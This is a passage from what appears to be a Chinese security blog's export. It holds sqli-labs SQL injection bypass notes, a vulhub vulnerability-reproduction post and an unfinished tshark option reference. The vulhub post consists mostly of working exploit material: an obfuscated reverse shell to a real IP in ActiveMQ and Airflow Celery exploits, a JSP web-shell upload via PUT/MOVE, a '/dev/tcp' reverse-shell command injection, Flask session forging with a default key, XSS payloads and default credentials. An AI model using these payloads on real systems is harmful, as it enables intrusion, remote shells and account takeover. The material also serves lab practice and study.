<p>1.大小写转化（不行）</p>
<p>2.双写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-25/?id=-1&#x27; union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema = &#x27;security&#x27;)--+</span><br></pre></td></tr></table></figure>
<p>对information也要双写</p>
<p>3.利用符号形式（只对实际的or和and起作用，对单词内还是需要双写）</p>
<p>||—or</p>
<p>%26%26—and</p>
<h2 id="less25a">less25a</h2>
<p>将之前的脚本改一改</p>
<p>1.information处，and处</p>
<p>2.回显处改为Dumb（因为没有报错界面）</p>
<h2 id="less26">less26</h2>
<p>过滤了空格和注释，and，or</p>
<p>根据测试后发现通过url编码的情况下无法使用联合注入，可能是因为window的环境原因</p>
<p>之后可以使用报错函数注入，用括号绕过，记得双写即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27;||updatexml(1,concat(&#x27;$&#x27;,(database())),0)||&#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">0&#x27;||updatexml(1,concat(&#x27;$&#x27;,(select(concat(&#x27;$&#x27;,id,&#x27;$&#x27;,username,&#x27;$&#x27;,passwoorrd))from(users)where(username)=&#x27;admin&#x27;)),0)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
<h2 id="less26a">less26a</h2>
<p>基于26的盲注</p>
<p>但是没法使用union注入，所以大概是做不了(需要linux)</p>
<h2 id="less27">less27</h2>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>sql安全</tag>
      </tags>
  </entry>
  <entry>
    <title>vulhub复现</title>
    <url>/2023/08/15/22-30-45/</url>
    <content><![CDATA[<h1>vulhub复现</h1>
<span id="more"></span>
<h1>A</h1>
<h2 id="activemq">activemq</h2>
<h3 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）">ActiveMQ 反序列化漏洞（CVE-2015-5254）</h3>
<p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
<p><code>通过web管理页面访问消息并触发漏洞这个过程需要管理员权限</code></p>
<p>通过jmet-0.1.0-all.jar中的ysoserial生成Payload进行getshell（需要进行编码）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzkuMTU0LjIxOS8xMjM0NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 43.139.154.219 61616</span><br></pre></td></tr></table></figure>
<h3 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）ActiveMQ-5-0-0-5-13-2">ActiveMQ任意文件写入漏洞（CVE-2016-3088）ActiveMQ 5.0.0 - 5.13.2</h3>
<p>ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUT /fileserver/1.txt HTTP/1.1</span><br><span class="line">Host: 43.139.154.219:8161</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 327</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"> out.print(&quot;Hello&lt;/br&gt;&quot;);</span><br><span class="line"> String strcmd=request.getParameter(&quot;cmd&quot;);</span><br><span class="line"> String line=null;</span><br><span class="line"> Process p=Runtime.getRuntime().exec(strcmd);</span><br><span class="line"> BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line"> while((line=br.readLine())!=null)&#123;</span><br><span class="line"> out.print(line+&quot;&lt;/br&gt;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MOVE /fileserver/1.txt HTTP/1.1</span><br><span class="line">Destination:file:///opt/activemq/webapps/api/5.jsp</span><br><span class="line">Host: 43.139.154.219:8161</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
<h3 id="ActiveMQ其他漏洞">ActiveMQ其他漏洞</h3>
<p><a href="https://github.com/justbaibai/Armory/tree/main/a/ActiveMQ">https://github.com/justbaibai/Armory/tree/main/a/ActiveMQ</a></p>
<h4 id="弱密码">弱密码</h4>
<p>admin/admin</p>
<h4 id="未授权漏洞">未授权漏洞</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin/connections.jsp</span><br><span class="line">/api</span><br></pre></td></tr></table></figure>
<h4 id="信息泄露">信息泄露</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.example.com:8161//admin/index.jsp</span><br><span class="line">http://www.example.com:8161//admin/queues.jsp</span><br><span class="line">http://www.example.com:8161//admin/topics.jsp</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">会返回应用名称，JVM，操作系统以及内核版本等信息。</span><br><span class="line">telnet ip:61616</span><br><span class="line"></span><br><span class="line">影响版本：</span><br><span class="line">apache-activemq-5.15.0 to apache-activemq-5.15.2</span><br><span class="line">apache-activemq-5.14.0 to apache-activemq-5.14.5</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUT /fileserver/a../%08     较低版本有用</span><br></pre></td></tr></table></figure>
<h4 id="XSS漏洞">XSS漏洞</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin/queueBrowse/example.A?view=rss&amp;feedType=&lt;script&gt;alert(&quot;ACTIVEMQ&quot;)&lt;/script&gt; </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/createDestination.action?JMSDestination=[XSS_PAYLOAD]</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin/queues.jsp?QueueFilter=yu1ey%22%3e%3cscript%3ealert(%22SpiderLabs%22)%3c%2fscript%3eqb68</span><br></pre></td></tr></table></figure>
<h2 id="airflow">airflow</h2>
<h3 id="Apache-Airflow-示例dag中的命令注入（CVE-2020-11978）">Apache Airflow 示例dag中的命令注入（CVE-2020-11978）</h3>
<p>未授权的访问者可以通过这个漏洞在Worker中执行任意命令。</p>
<p>进入airflow管理端，将<code>example_trigger_target_dag</code>前面的Off改为On：</p>
<p><img src="/img/image-20230726140237544.png" alt="image-20230726140237544" /></p>
<p>然后再Trigger DAG: example_trigger_target_dag中执行命令即可</p>
<p><img src="/img/image-20230726140226424.png" alt="image-20230726140226424" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;\&quot;;bash -i &gt;&amp; /dev/tcp/43.139.154.219/1234 0&gt;&amp;1;#&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>原理，通过example_trigger_target_dagschedule: None直接调用dag_run，然后使用字符串拼接得到</p>
<p><img src="/img/image-20230726145900450.png" alt="image-20230726145900450" /></p>
<h3 id="Apache-Airflow-Celery-消息中间件命令执行（CVE-2020-11981）">Apache Airflow Celery 消息中间件命令执行（CVE-2020-11981）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">import redis</span><br><span class="line">import sys</span><br><span class="line">r = redis.Redis(host=sys.argv[1], port=6379, decode_responses=True,db=0) </span><br><span class="line">queue_name = &#x27;default&#x27;</span><br><span class="line">ori_str=&quot;&#123;\&quot;content-encoding\&quot;: \&quot;utf-8\&quot;, \&quot;properties\&quot;: &#123;\&quot;priority\&quot;: 0, \&quot;delivery_tag\&quot;: \&quot;f29d2b4f-b9d6-4b9a-9ec3-029f9b46e066\&quot;, \&quot;delivery_mode\&quot;: 2, \&quot;body_encoding\&quot;: \&quot;base64\&quot;, \&quot;correlation_id\&quot;: \&quot;ed5f75c1-94f7-43e4-ac96-e196ca248bd4\&quot;, \&quot;delivery_info\&quot;: &#123;\&quot;routing_key\&quot;: \&quot;celery\&quot;, \&quot;exchange\&quot;: \&quot;\&quot;&#125;, \&quot;reply_to\&quot;: \&quot;fb996eec-3033-3c10-9ee1-418e1ca06db8\&quot;&#125;, \&quot;content-type\&quot;: \&quot;application/json\&quot;, \&quot;headers\&quot;: &#123;\&quot;retries\&quot;: 0, \&quot;lang\&quot;: \&quot;py\&quot;, \&quot;argsrepr\&quot;: \&quot;(100, 200)\&quot;, \&quot;expires\&quot;: null, \&quot;task\&quot;: \&quot;airflow.executors.celery_executor.execute_command\&quot;, \&quot;kwargsrepr\&quot;: \&quot;&#123;&#125;\&quot;, \&quot;root_id\&quot;: \&quot;ed5f75c1-94f7-43e4-ac96-e196ca248bd4\&quot;, \&quot;parent_id\&quot;: null, \&quot;id\&quot;: \&quot;ed5f75c1-94f7-43e4-ac96-e196ca248bd4\&quot;, \&quot;origin\&quot;: \&quot;gen1@132f65270cde\&quot;, \&quot;eta\&quot;: null, \&quot;group\&quot;: null, \&quot;timelimit\&quot;: [null, null]&#125;, \&quot;body\&quot;: \&quot;W1sxMDAsIDIwMF0sIHt9LCB7ImNoYWluIjogbnVsbCwgImNob3JkIjogbnVsbCwgImVycmJhY2tzIjogbnVsbCwgImNhbGxiYWNrcyI6IG51bGx9XQ==\&quot;&#125;&quot;</span><br><span class="line">task_dict = json.loads(ori_str)</span><br><span class="line">#command = [&#x27;touch&#x27;, &#x27;/tmp/airflow_celery_success&#x27;]</span><br><span class="line">command = [&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzkuMTU0LjIxOS8xMjM0NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;]</span><br><span class="line">body=[[command], &#123;&#125;, &#123;&quot;chain&quot;: None, &quot;chord&quot;: None, &quot;errbacks&quot;: None, &quot;callbacks&quot;: None&#125;]</span><br><span class="line">print(body)</span><br><span class="line">task_dict[&#x27;body&#x27;]=base64.b64encode(json.dumps(body).encode()).decode()</span><br><span class="line">print(task_dict)</span><br><span class="line">r.lpush(queue_name,json.dumps(task_dict))</span><br></pre></td></tr></table></figure>
<h3 id="Apache-Airflow-默认密钥导致的权限绕过（CVE-2020-17526）">Apache Airflow 默认密钥导致的权限绕过（CVE-2020-17526）</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install flask-unsign</span><br><span class="line">pip3 install flask-unsign[wordlist]</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v http://localhost:8080/admin/airflow/login</span><br><span class="line">*   Trying 127.0.0.1:8080...</span><br><span class="line">* Connected to localhost (127.0.0.1) port 8080 (#0)</span><br><span class="line">&gt; GET /admin/airflow/login HTTP/1.1</span><br><span class="line">&gt; Host: localhost:8080</span><br><span class="line">&gt; User-Agent: curl/7.88.1</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Server: gunicorn/19.10.0</span><br><span class="line">&lt; Date: Wed, 26 Jul 2023 07:44:11 GMT</span><br><span class="line">&lt; Connection: close</span><br><span class="line">&lt; Content-Type: text/html; charset=utf-8</span><br><span class="line">&lt; Content-Length: 7750</span><br><span class="line">&lt; Vary: Cookie</span><br><span class="line">&lt; Set-Cookie: session=eyJjc3JmX3Rva2VuIjoiN2QyYmViNjhhMjNkNjk4ZDdlZjJmM2M1M2ZhYThmZjU4MjNjNGM0MSJ9.ZMDOyw.2giwxxnjtgQEvMgUlvvCozp0hsg; HttpOnly; Path=/</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flask-unsign -u -c eyJjc3JmX3Rva2VuIjoiN2QyYmViNjhhMjNkNjk4ZDdlZjJmM2M1M2ZhYThmZjU4MjNjNGM0MSJ9.ZMDOyw.2giwxxnjtgQEvMgUlvvCozp0hsg</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flask-unsign -s --secret temporary_key -c &quot;&#123;&#x27;user_id&#x27;: &#x27;1&#x27;, &#x27;_fresh&#x27;: False, &#x27;_permanent&#x27;: True&#125;&quot;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>tshark</title>
    <url>/2023/03/13/11-22-43/</url>
    <content><![CDATA[<h1>tshark</h1>
<span id="more"></span>
<h2 id="基本使用">基本使用</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">抓拍界面：</span><br><span class="line">  -i &lt;接口&gt;, --interface &lt;接口&gt;</span><br><span class="line">                           接口的名称或 idx（默认：第一个非环回）</span><br><span class="line">  -f &lt;capture filter&gt; libpcap 过滤器语法中的数据包过滤器</span><br><span class="line">  -s &lt;snaplen&gt;, --snapshot-length &lt;snaplen&gt;</span><br><span class="line">                           数据包快照长度（默认值：适当的最大值）</span><br><span class="line">  -p, --no-promiscuous-mode</span><br><span class="line">                           不要在混杂模式下捕获</span><br><span class="line">  -I, --monitor-mode 在监控模式下捕获，如果可用</span><br><span class="line">  -B &lt;缓冲区大小&gt;, --buffer-size &lt;缓冲区大小&gt;</span><br><span class="line">                           内核缓冲区的大小（默认：2MB）</span><br><span class="line">  -y &lt;链接类型&gt;, --linktype &lt;链接类型&gt;</span><br><span class="line">                           链路层类型（默认：第一个合适的）</span><br><span class="line">  --time-stamp-type &lt;type&gt; 接口的时间戳方法</span><br><span class="line">  -D, --list-interfaces 打印接口列表并退出</span><br><span class="line">  -L, --list-data-link-types</span><br><span class="line">                           打印 iface 的链路层类型列表并退出</span><br><span class="line">  --list-time-stamp-types 打印 iface 的时间戳类型列表并退出</span><br><span class="line"></span><br><span class="line">捕获停止条件：</span><br><span class="line">  -c &lt;packet count&gt; 在 n 个数据包后停止（默认：无限）</span><br><span class="line">  -a &lt;自动停止条件&gt; ..., --autostop &lt;自动停止条件&gt; ...</span><br><span class="line">                           持续时间：NUM - NUM 秒后停止</span><br><span class="line">                           文件大小：NUM - 在 NUM KB 后停止此文件</span><br><span class="line">                              files:NUM - 在 NUM 个文件后停止</span><br><span class="line">                            packets:NUM - 在 NUM 个数据包后停止</span><br><span class="line">捕获输出：</span><br><span class="line">  -b &lt;ringbuffer opt.&gt; ..., --ring-buffer &lt;ringbuffer opt.&gt;</span><br><span class="line">                           duration:NUM - NUM 秒后切换到下一个文件</span><br><span class="line">                           filesize:NUM - 在 NUM KB 之后切换到下一个文件</span><br><span class="line">                              files:NUM - ringbuffer: 在 NUM 个文件之后替换</span><br><span class="line">                            packets:NUM - 在 NUM 个数据包之后切换到下一个文件</span><br><span class="line">                           interval:NUM - 到时切换到下一个文件</span><br><span class="line">                                          NUM 秒的精确倍数</span><br><span class="line">输入文件：</span><br><span class="line">  -r &lt;infile&gt;, --read-file &lt;infile&gt;</span><br><span class="line">                           设置要读取的文件名（或标准输入为“-”）</span><br><span class="line">                           </span><br><span class="line">处理：</span><br><span class="line">  -2 执行两遍分析</span><br><span class="line">  -M &lt;packet count&gt; 执行会话自动重置</span><br><span class="line">  -R &lt;读取过滤器&gt;, --read-filter &lt;读取过滤器&gt;</span><br><span class="line">                           Wireshark 显示过滤器语法中的数据包读取过滤器</span><br><span class="line">                           （需要-2）</span><br><span class="line">  -Y &lt;显示过滤器&gt;, --display-filter &lt;显示过滤器&gt;</span><br><span class="line">                           Wireshark 显示过滤器中的数据包显示过滤器</span><br><span class="line">                           句法</span><br><span class="line">  -n 禁用所有名称解析（def: &quot;mNd&quot; 启用，或</span><br><span class="line">                           在首选项中设置）</span><br><span class="line">  -N &lt;名称解析标志&gt; 启用特定名称解析：“mnNtdv”</span><br><span class="line">  -d &lt;layer_type&gt;==&lt;selector&gt;,&lt;decode_as_protocol&gt; ...</span><br><span class="line">                           “解码为”，详细信息请参见手册页</span><br><span class="line">                           示例：tcp.port==8888,http</span><br><span class="line">  -H &lt;hosts file&gt; 从主机文件中读取条目列表，这将</span><br><span class="line">                           然后写入捕获文件。 （暗示-W n）</span><br><span class="line">  --enable-protocol &lt;proto_name&gt;</span><br><span class="line">                           启用 proto_name 的剖析</span><br><span class="line">  --disable-protocol &lt;proto_name&gt;</span><br><span class="line">                           禁用 proto_name 的剖析</span><br><span class="line">  --enable-heuristic &lt;short_name&gt;</span><br><span class="line">                           启用启发式协议的剖析</span><br><span class="line">  --disable-heuristic &lt;short_name&gt;</span><br><span class="line">                           禁用启发式协议的剖析</span><br><span class="line">  输出：</span><br><span class="line">  -w &lt;outfile|-&gt; 将数据包写入名为“outfile”的 pcapng 格式文件</span><br><span class="line">                           （或“-”用于标准输出）</span><br><span class="line">  --capture-comment &lt;评论&gt;</span><br><span class="line">                           如果支持，添加捕获文件注释</span><br><span class="line">  -C &lt;config profile&gt; 从指定的配置文件开始</span><br><span class="line">  -F &lt;output file type&gt; 设置输出文件类型，默认为pcapng</span><br><span class="line">                           空的“-F”选项将列出文件类型</span><br><span class="line">  -V 添加数据包树的输出（数据包详细信息）</span><br><span class="line">  -O &lt;protocols&gt; 只显示这些协议的数据包详细信息，逗号</span><br><span class="line">                           分离</span><br><span class="line">  -P, --print 打印数据包摘要，即使在写入文件时也是如此</span><br><span class="line">  -S &lt;separator&gt; 在数据包之间打印的行分隔符</span><br><span class="line">  -x 添加十六进制和 ASCII 转储的输出（数据包字节）</span><br><span class="line">  --hexdump &lt;hexoption&gt; 添加 hexdump，设置数据源和 ASCII 转储的选项</span><br><span class="line">     all 转储所有数据源（-x 默认）</span><br><span class="line">     帧仅转储帧数据源</span><br><span class="line">     ascii 包括 ASCII 转储文本（-x 默认值）</span><br><span class="line">     delimit 用 &#x27;|&#x27; 分隔 ASCII 转储文本人物</span><br><span class="line">     noascii 排除 ASCII 转储文本</span><br><span class="line">     help 显示 --hexdump 的帮助并退出</span><br><span class="line">  -T pdml|ps|psml|json|jsonraw|ek|tabs|文本|字段|?</span><br><span class="line">                           文本输出格式（默认：文本）</span><br><span class="line">  -j &lt;protocolfilter&gt; 如果选择了 -T ek|pdml|json，则协议层过滤</span><br><span class="line">                           （例如“ip ip.flags text”，过滤器不展开子</span><br><span class="line">                           节点，除非在过滤器中也指定了子节点）</span><br><span class="line">  -J &lt;protocolfilter&gt; 顶级协议过滤器，如果选择 -T ek|pdml|json</span><br><span class="line">                           （例如“http tcp”，展开所有子节点的过滤器）</span><br><span class="line">  -e &lt;field&gt; 如果选择了 -Tfields 则要打印的字段（例如 tcp.port，</span><br><span class="line">                           _ws.col.Info)</span><br><span class="line">                           可以重复此选项以打印多个字段</span><br><span class="line">  -E&lt;fieldsoption&gt;=&lt;value&gt; 选择 -Tfields 时设置输出选项：</span><br><span class="line">     bom=y|n 打印 UTF-8 BOM</span><br><span class="line">     header=y|n 打开和关闭标题</span><br><span class="line">     separator=/t|/s|&lt;char&gt; 选择制表符、空格、可打印字符作为分隔符</span><br><span class="line">     occurrence=f|l|a 打印每个字段的第一次、最后一次或所有出现</span><br><span class="line">     aggregator=,|/s|&lt;char&gt; 选择逗号、空格、可打印字符作为</span><br><span class="line">                           聚合器</span><br><span class="line">     quote=d|s|n select double, single, no quotes for values</span><br><span class="line">  -t a|ad|adoy|d|dd|e|r|u|ud|udoy</span><br><span class="line">                           时间戳的输出格式（def: r: rel. to first）</span><br><span class="line">  -u s|hms 秒的输出格式（def: s: seconds）</span><br><span class="line">  -l 在每个数据包之后刷新标准输出</span><br><span class="line">  -q 在 stdout 上更安静（例如，在使用统计信息时）</span><br><span class="line">  -Q 仅将真实错误记录到 stderr（比 -q 更安静）</span><br><span class="line">  -g 启用对输出文件的组读访问</span><br><span class="line">  -W n 如果支持，在文件中保存额外信息。</span><br><span class="line">                           n = 写入网络地址解析信息</span><br><span class="line">  -X &lt;key&gt;:&lt;value&gt; 扩展选项，详见手册页</span><br><span class="line">  -U tap_name PDUs 导出模式，详见手册页</span><br><span class="line">  -z &lt;statistics&gt; 各种统计，详见手册页</span><br><span class="line">  --export-objects &lt;协议&gt;,&lt;目标目录&gt;</span><br><span class="line">                           将协议的导出对象保存到目录</span><br><span class="line">                           名为“destdir”</span><br><span class="line">  --export-tls-session-keys &lt;密钥文件&gt;</span><br><span class="line">                           将 TLS 会话密钥导出到名为“keyfile”的文件</span><br><span class="line">  --color 颜色输出文本类似于 Wireshark GUI，</span><br><span class="line">                           需要支持 24 位颜色的终端</span><br><span class="line">                           还为 pdml 和 psml 格式提供颜色属性</span><br><span class="line">                           （注意属性是非标准的）</span><br><span class="line">  --no-duplicate-keys 如果指定-T json，合并对象中的重复键</span><br><span class="line">                           进入一个单一的键，作为价值一个包含所有的json数组</span><br><span class="line">                           价值观</span><br><span class="line">  --elastic-mapping-filter &lt;protocols&gt; 如果指定了-G elastic-mapping，则只放</span><br><span class="line">                           映射文件中指定的协议</span><br><span class="line">  --temp-dir &lt;directory&gt; 将临时文件写入此目录</span><br><span class="line">                           （默认值：/tmp）</span><br><span class="line"></span><br><span class="line">诊断输出：</span><br><span class="line">  --log-level &lt;level&gt; 设置活动日志级别（“严重”、“警告”等）</span><br><span class="line">  --log-fatal &lt;level&gt; 设置中止程序的级别（“严重”或“警告”）</span><br><span class="line">  --log-domains &lt;[!]list&gt; 活动日志域的逗号分隔列表</span><br><span class="line">  --log-debug &lt;[!]list&gt; 以逗号分隔的具有“调试”级别的域列表</span><br><span class="line">  --log-noisy &lt;[!]list&gt; 以逗号分隔的具有“嘈杂”级别的域列表</span><br><span class="line">  --log-file &lt;path&gt; 将消息输出到的文件（除了 stderr）</span><br><span class="line"></span><br><span class="line">各种各样的：</span><br><span class="line">  -h, --help 显示帮助并退出</span><br><span class="line">  -v, --version 显示版本信息并退出</span><br><span class="line">  -o &lt;名称&gt;:&lt;值&gt; ... 覆盖首选项设置</span><br><span class="line">  -K &lt;keytab&gt; 用于 kerberos 解密的密钥表文件</span><br><span class="line">  -G [report] 转储几个可用报告之一并退出</span><br><span class="line">                           默认报告=“字段”</span><br><span class="line">                           使用“-G help”获取更多帮助</span><br><span class="line"></span><br><span class="line">Dumpcap 可以受益于启用的 BPF JIT 编译器（如果可用）。</span><br><span class="line">您可能希望通过执行以下命令来启用它：</span><br><span class="line"> “echo 1 &gt; /proc/sys/net/core/bpf_jit_enable”</span><br><span class="line">请注意，这可能会降低您的系统的安全性！</span><br></pre></td></tr></table></figure>
<h2 id="抓取功能解释以及使用">抓取功能解释以及使用</h2>
<ul>
<li><code>-i &lt;interface&gt;, --interface &lt;interface&gt;</code>：指定要抓取数据包的网络接口的名称或者索引号，例如<code>eth0</code>或<code>1</code>。</li>
<li><code>-f &lt;capture filter&gt;</code>：使用libpcap过滤器语法来选择要捕获的数据包，例如<code>tcp port 80</code>仅抓取目标端口为80的TCP数据包。</li>
<li><code>-s &lt;snaplen&gt;, --snapshot-length &lt;snaplen&gt;</code>：设置抓包的数据快照长度，即抓包的数据包中只会抓取前snaplen个字节，默认值为适当的最大值。</li>
<li><code>-p, --no-promiscuous-mode</code>：关闭混杂模式，即只捕获目标接口上的流量，而非所有流量。</li>
<li><code>-I, --monitor-mode</code>：在监控模式下捕获数据包，如果可用。监控模式可以通过禁止网卡的MAC地址过滤，并提供接受非管理数据包的能力。</li>
<li><code>-B &lt;buffer size&gt;, --buffer-size &lt;buffer size&gt;</code>：设置内核缓冲区的大小，可以用于控制捕获的数据包数量和占用内存的量，默认为2MB。</li>
<li><code>-y &lt;linktype&gt;, --linktype &lt;linktype&gt;</code>：指定要抓取的数据包的链路层类型。如果没有指定，则tshark会尝试找到合适的类型。</li>
<li><code>--time-stamp-type &lt;type&gt;</code>：设置接口的时间戳方法，例如<code>adapter_unsynced</code>或<code>adapter_fine_tstamp</code>。</li>
<li><code>-D, --list-interfaces</code>：列出可用的网络接口列表并退出。</li>
<li><code>-L, --list-data-link-types</code>：列出可用的链路层类型列表并退出。</li>
<li><code>--list-time-stamp-types</code>：列出可用的时间戳类型列表并退出。</li>
</ul>
<h2 id="捕获停止条件">捕获停止条件</h2>
<p><code>-c &lt;packet count&gt;</code>: 用于在捕获指定数量的数据包后停止抓包。例如，使用-c 100表示在捕获100个数据包后停止。</p>
<p><code>-a &lt;auto stop condition&gt;</code>: 自动停止抓包的条件。可以使用多个选项组合，例如-a duration:60 -a filesize:1000。一些选项包括： duration:NUM - 在 NUM 秒后停止</p>
<p>filesize:NUM - 在 NUM KB 后停止此文件</p>
<p>files:NUM - 在 NUM 个文件后停止</p>
<p>packets:NUM - 在 NUM 个数据包后停止</p>
<p><code>-b &lt;ringbuffer opt.&gt;</code>: 用于将抓包的输出写入环形缓冲区。一些选项包括：</p>
<p>duration:NUM - NUM 秒后切换到下一个文件</p>
<p>filesize:NUM - 在 NUM KB 之后切换到下一个文件</p>
<p>files:NUM - 在 NUM 个文件之后替换</p>
<p>packets:NUM - 在 NUM 个数据包之后切换到下一个文件</p>
<p>interval:NUM - 到时切换到下一个文件，其中 NUM 是秒的精确倍数。</p>
<h2 id="读取">读取</h2>
<p><code>-r &lt;infile&gt;</code>: 用于指定要读取的pcap文件的名称，或使用“-”表示从标准输入读取。</p>
<h2 id="处理">处理</h2>
<p><code>-2</code>: 执行两遍分析。第一遍分析确定所有数据包并计算它们的长度和时间戳。第二遍执行进一步的分析，例如读取和应用读取过滤器。</p>
<p><code>-M &lt;packet count&gt;</code>: 执行会话自动重置。当指定的数据包数量被捕获时，将自动重置捕获的会话。</p>
<p><code>-R &lt;读取过滤器&gt;, --read-filter &lt;读取过滤器&gt;</code>: Wireshark 显示过滤器语法中的数据包读取过滤器。这个过滤器可以用来限制哪些数据包将被处理和显示。</p>
<p><code>-Y &lt;显示过滤器&gt;, --display-filter &lt;显示过滤器&gt;</code>: Wireshark 显示过滤器中的数据包显示过滤器语法。这个过滤器可以用来限制哪些数据包将在输出中显示。</p>
<p><code>-n: 禁用所有名称解析</code>。默认情况下，tshark 将尝试对 IP 地址、端口号和 MAC 地址进行名称解析。使用此选项可以禁用名称解析。</p>
<p><code>-N &lt;名称解析标志&gt;</code>: 启用特定名称解析。名称解析标志是一个包含以下字符的字符串，其中每个字符代表一个名称解析标志: “m” 表示 MAC 地址解析；“n” 表示网络地址解析；“N” 表示网络和主机名解析；“t” 表示主机名解析；“d” 表示 DNS 解析；“v” 表示 DNS 反向解析。例如，使用选项 “-N nd” 将启用网络地址解析和 DNS 解析。</p>
<p><code>-d &lt;layer_type&gt;==&lt;selector&gt;,&lt;decode_as_protocol&gt; ...</code>: “解码为”选项允许将一个协议解析为另一个协议。此选项的语法为“&lt;layer_type&gt;=<selector>, &lt;decode_as_protocol&gt;”。例如，使用选项“tcp.port=8888,http”将解析 TCP 端口 8888 的流量为 HTTP 协议。</p>
<p><code>-H &lt;hosts file&gt;</code>: 从主机文件中读取条目列表，这将然后写入捕获文件。这个选项只在使用 -W n 时才有效。</p>
<p><code>--enable-protocol &lt;proto_name&gt;</code>: 启用指定协议的剖析。可以使用该选项启用单个协议剖析。</p>
<p><code>--disable-protocol &lt;proto_name&gt;</code>: 禁用指定协议的剖析。可以使用该选项禁用单个协议剖析。</p>
<p><code>--enable-heuristic &lt;short_name&gt;</code>: 启用启发式协议的剖析。启发式协议是指在协议头缺失或损坏时，使用其他信息来推断协议类型的技术。</p>
<p><code>--disable-heuristic &lt;short_name&gt;</code>: 禁用启发式协议的剖析。</p>
<h2 id="输出">输出</h2>
<ul>
<li>
<p>-w &lt;outfile|-&gt; : 将数据包写入名为“outfile”的pcapng格式文件（或“-”用于标准输出）。</p>
</li>
<li>
<p>–capture-comment <comment> : 如果支持，添加捕获文件注释。</p>
</li>
<li>
<p>-C <config profile> : 从指定的配置文件开始。</p>
</li>
<li>
<p>-F <output file type> : 设置输出文件类型，默认为pcapng。空的“-F”选项将列出文件类型。</p>
</li>
<li>
<p>-V : 添加数据包树的输出（数据包详细信息）。</p>
</li>
<li>
<p>-O <protocols> : 只显示这些协议的数据包详细信息，逗号分离。</p>
</li>
<li>
